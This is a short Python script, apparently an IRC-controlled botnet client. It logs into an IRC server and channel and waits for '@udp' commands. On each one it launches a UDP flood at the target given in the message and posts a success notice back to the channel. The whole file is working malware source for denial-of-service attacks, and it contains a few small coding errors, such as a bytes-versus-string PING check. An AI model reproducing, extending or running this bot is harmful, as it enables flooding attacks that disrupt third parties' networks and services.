import socket
import udp

server = 'irc.freenode.net'
port = 6667
channel = b'pentest'
nick = b'bot'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server,port))
s.send(b'NICK %s\n' %nick)
s.send(b'USER ' + nick + b' ' + nick + b' ' + nick + b' .:\n')
s.send(b'Join %s\n' %channel)
s.recv(1024)
while True:
    msg = s.recv(1024)
    if msg[0:4] == 'PING':
        s.send(msg.replace(b'PING',b'PONG'))
    elif b'@udp' in msg:
        target = msg.split(b'@udp')[-1].strip().decode().split()
        udp.flood(*target)
        s.send(b'PRIVMSG %s : UDP flood executed with sucess!\r\n' %channel)